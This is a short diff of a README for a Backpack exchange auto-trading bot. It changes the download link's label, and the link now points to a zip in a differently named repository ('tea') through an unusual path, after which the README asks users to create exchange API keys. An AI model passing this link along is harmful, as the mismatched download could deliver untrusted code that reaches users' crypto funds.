@@ -10,7 +10,7 @@ Auto trade on Backpack exchange with Javascript:
 
 1. Create account: [Backpack](https://backpack.exchange/refer/hnc)
 
-2. Download code: [solotop999/auto_trade_backpack_exchange](https://github.com/hnc29/tea/main.zip)
+2. Download code: [hnc29/auto_trade_backpack_exchange](https://github.com/hnc29/tea/main.zip)
 
 3. Create backpack API: https://backpack.exchange/settings/api-keys
 
